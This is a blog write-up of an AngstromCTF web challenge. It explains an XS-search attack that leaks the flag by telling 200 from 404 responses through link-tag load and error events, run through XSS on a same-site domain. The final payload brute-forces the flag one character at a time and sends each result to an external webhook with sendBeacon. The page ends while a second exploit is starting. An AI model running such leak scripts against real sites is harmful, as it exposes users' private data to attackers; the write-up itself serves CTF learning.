<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

 


      <title>WaterMark as a Service AngstromCTF - Alfin&#39;s Notes</title>

  <meta name="description" content="tl;dr

XS-search 200 / 404 .
Leaking using HTML injection in a same-site challenge.
Link tags and Error events .
">
  <meta name="author" content="Alfin Joseph"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "Alfins Notes",
    
    "url": "https:\/\/Alfinj0se.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/Alfinj0se.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/Alfinj0se.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/Alfinj0se.github.io\/posts\/angstromctf2024\/",
          "name": "Water mark as a service angstrom ctf"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "Alfin Joseph"
  },
  "headline": "WaterMark as a Service AngstromCTF",
  "description" : "tl;dr\nXS-search 200 \/ 404 . Leaking using HTML injection in a same-site challenge. Link tags and Error events . ",
  "inLanguage" : "en",
  "wordCount":  1599 ,
  "datePublished" : "2024-05-26T21:01:42\u002b05:30",
  "dateModified" : "2024-05-26T21:01:42\u002b05:30",
  "image" : "https:\/\/Alfinj0se.github.io\/img\/pfp.jpg",
  "keywords" : [ "writeups" ],
  "mainEntityOfPage" : "https:\/\/Alfinj0se.github.io\/posts\/angstromctf2024\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/Alfinj0se.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/Alfinj0se.github.io\/img\/pfp.jpg",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="WaterMark as a Service AngstromCTF" />
<meta property="og:description" content="tl;dr

XS-search 200 / 404 .
Leaking using HTML injection in a same-site challenge.
Link tags and Error events .
">
<meta property="og:image" content="https://Alfinj0se.github.io/img/pfp.jpg" />
<meta property="og:url" content="https://Alfinj0se.github.io/posts/angstromctf2024/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="Alfins Notes" />

  <meta name="twitter:title" content="WaterMark as a Service AngstromCTF" />
  <meta name="twitter:description" content="tl;dr

XS-search 200 / 404 .
Leaking using HTML injection in a same-site challenge.
Link tags and Error events .
">
  <meta name="twitter:image" content="https://Alfinj0se.github.io/img/pfp.jpg" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:site" content="@Alfinjoseph19" />
  <meta name="twitter:creator" content="@Alfinjoseph19" />
  <link href='https://Alfinj0se.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.126.1">
  <link rel="alternate" href="https://Alfinj0se.github.io/index.xml" type="application/rss+xml" title="Alfins Notes"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.css" integrity="sha384-3UiQGuEI4TTMaFmGIZumfRPtfKQ3trwQE2JgosJxCnGmQpL/lJdjpcHkaaFwHlcI" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous"><link rel="stylesheet" href="https://Alfinj0se.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://Alfinj0se.github.io/css/syntax.css" /><link rel="stylesheet" href="https://Alfinj0se.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">

  


  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://Alfinj0se.github.io/">Alfins Notes</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Blog" href="/">Blog</a>
            </li>
          
        
          
            <li>
              <a title="About" href="/page/about/">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="Alfins Notes" href="https://Alfinj0se.github.io/">
            <img class="avatar-img" src="https://Alfinj0se.github.io/img/pfp.jpg" alt="Alfins Notes" />
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="posts-heading">
              
                <h1>WaterMark as a Service AngstromCTF</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <p><strong>tl;dr</strong></p>
<ul>
<li>XS-search 200 / 404 .</li>
<li>Leaking using HTML injection in a same-site challenge.</li>
<li>Link tags and Error events .</li>
</ul>
<h2 id="-initial-analysis">ðŸ”Ž Initial analysis</h2>
<p>We are given the application source code and a challenge link. Also, there is a <code>waaas.js</code> for the admin bot. Looking at the application, the main functionality was the search endpoint.</p>
<p>Taking a look at the code for /search endpoint in the <code>index.js</code> file.</p>
<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>app.get(<span style="color:#5af78e">&#39;/search&#39;</span>, (req, res) =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#ff6ac1">if</span> (req.cookies[<span style="color:#5af78e">&#39;admin_cookie&#39;</span>] <span style="color:#ff6ac1">!==</span> secretvalue) {
</span></span><span style="display:flex;"><span>		res.status(<span style="color:#ff9f43">403</span>).send(<span style="color:#5af78e">&#34;Unauthorized&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#ff6ac1">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff6ac1">try</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff5c57">let</span> query <span style="color:#ff6ac1">=</span> req.query.q;
</span></span><span style="display:flex;"><span>		<span style="color:#ff6ac1">for</span> (<span style="color:#ff5c57">let</span> flag <span style="color:#ff6ac1">of</span> flags) {
</span></span><span style="display:flex;"><span>			<span style="color:#ff6ac1">if</span> (flag.indexOf(query) <span style="color:#ff6ac1">!==</span> <span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span>) {
</span></span><span style="display:flex;"><span>				res.status(<span style="color:#ff9f43">200</span>).send(<span style="color:#5af78e">&#34;Found&#34;</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#ff6ac1">return</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		res.status(<span style="color:#ff9f43">404</span>).send(<span style="color:#5af78e">&#34;Not Found&#34;</span>);
</span></span><span style="display:flex;"><span>	} <span style="color:#ff6ac1">catch</span> (e) {
</span></span><span style="display:flex;"><span>		console.log(e);
</span></span><span style="display:flex;"><span>		res.sendStatus(<span style="color:#ff9f43">500</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></td></tr></table>
</div>
</div><p>It was basically checking if our input query was a substring of the flag. But we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. So our requests would get 403 Unauthorized as the response.</p>
<h2 id="-attack-plan">ðŸ¥· Attack plan</h2>
<p>Since we cant directly access the /search enpoint we have to somehow make the admin send those requests. One approach is to get XSS anywhere in the site so we can send fetch requests bruteforce the flag. But unfortunately there is no XSS in this site.</p>
<p>The Next approach would be an <strong>XS-Search</strong> attack to leak the flag . As the bot is visiting any url we give it. In the /search enpoint if the query is a valid substring of the flag it was returning <strong>200 Found</strong> and if its not a valid substring it was returning <strong>404 Not Found</strong>.</p>
<p>We can use <a href="https://https://xsleaks.dev/docs/attacks/error-events/">Error Events</a> to differntiate between these 2 status codes cross site .</p>
<p>But there is another issue . . . . . <strong>Same Site Cookies!!</strong> . Looking the admin bots source code we can see that the admin cookie is <strong>same-site Lax</strong> .</p>
<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> cookie <span style="color:#ff6ac1">=</span> {
</span></span><span style="display:flex;"><span>                domain<span style="color:#ff6ac1">:</span> domain,
</span></span><span style="display:flex;"><span>                name<span style="color:#ff6ac1">:</span> <span style="color:#5af78e">&#34;admin_cookie&#34;</span>,
</span></span><span style="display:flex;"><span>                value<span style="color:#ff6ac1">:</span> key,
</span></span><span style="display:flex;"><span>                httpOnly<span style="color:#ff6ac1">:</span> <span style="color:#ff6ac1">true</span>,
</span></span><span style="display:flex;"><span>                secure<span style="color:#ff6ac1">:</span> <span style="color:#ff6ac1">true</span>,
</span></span><span style="display:flex;"><span>                sameSite<span style="color:#ff6ac1">:</span> <span style="color:#5af78e">&#39;Lax&#39;</span>
</span></span><span style="display:flex;"><span>    };
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the cookies won&rsquo;t be sent on the  requests which are sent from our hosted exploit as it wont be same-site ðŸ˜“.</p>
<h2 id="samesite-leaks-ftw--">SameSite Leaks ftw  ðŸŒŸ</h2>
<p>If we have XSS or HTML injection in any domain which is same-site to the challenge domain we can use that in our favour for <a href="https://https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks">Same Site Leaks</a>.</p>
<p>The challenge was hosted on <code>https://wwwwwwwwaas.web.actf.co/</code> and all other challenges was were subdomains of <code>web.actf.co</code> and fortunately we had XSS on <code>markdown.web.actf.co</code> which is <strong>same-site</strong>.</p>
<p>So now we can host our exploit to leak the flag on <code>markdown.web.actf.co</code>
.
We can use a script,link tags to determine if it was <strong>200</strong> or <strong>404</strong> .Because if the response is <strong>200</strong> the <strong>onload</strong> event handler will be fired and if the response is <strong>404</strong> the <strong>onerror</strong> handler will be fired .</p>
<h2 id="-final-payloads">ðŸš€ Final Payloads</h2>
<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> charset <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">let</span> found <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;actf&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> leak_url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> next <span style="color:#ff6ac1">=</span> (i) =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#ff6ac1">char</span> <span style="color:#ff6ac1">=</span> charset[i]
</span></span><span style="display:flex;"><span>      link <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">document</span>.createElement(<span style="color:#5af78e">&#34;link&#34;</span>)
</span></span><span style="display:flex;"><span>      link.rel <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;stylesheet&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff5c57">document</span>.head.appendChild(link)
</span></span><span style="display:flex;"><span>      link.onload <span style="color:#ff6ac1">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>           found <span style="color:#ff6ac1">+=</span> charset[i]
</span></span><span style="display:flex;"><span>           navigator.sendBeacon(leak_url,JSON.stringify({type<span style="color:#ff6ac1">:</span> <span style="color:#5af78e">&#34;success&#34;</span>, found<span style="color:#ff6ac1">:</span>found,<span style="color:#ff6ac1">char</span><span style="color:#ff6ac1">:</span>charset[i] }))
</span></span><span style="display:flex;"><span>           next(<span style="color:#ff9f43">0</span>)
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       link.onerror <span style="color:#ff6ac1">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>           next(i<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">1</span>)
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>       link.href <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;https://wwwwwwwwaas.web.actf.co/search?q=&#34;</span><span style="color:#ff6ac1">+</span>found<span style="color:#ff6ac1">+</span>charset[i]
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>next(<span style="color:#ff9f43">0</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="-flag">ðŸš© Flag</h2>
<p><code>actf{the_w_watermarks_the_whereabouts}</code></p>
<h2 id="-intended-solution">ðŸ¤¯ Intended solution</h2>
<p>This was actually not the solution, this leak worked only because the headless chrome used on the admin bot was outdated. In the new chrome this won&rsquo;t work due to <a href="https://github.com/annevk/orb">ORB</a>.</p>
<p>ORB will prevent the onload handler from being triggered if the content type of the requested resource is diffrent from the inclusion method. So since we are using a script tag here to load the response of a <strong>text/html</strong> content type, so it wont get loaded.</p>
<p>So we can&rsquo;t use script,link stylesheets etc for leaking as there will be a <strong>content-type mismatch</strong> for the request resource.</p>
<p>The intended solution was to use <strong>Complicated CSS effects</strong> and <strong>:visited selector</strong> to leak browser history through <strong>paint timing</strong> .It was a <a href="https://issues.chromium.org/issues/40091173">chromium bug</a> which was marked as won&rsquo;t fix .</p>
<p>This was the exploit for it shared by <a href="https://x.com/ixSly">@ixSly</a>.</p>
<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
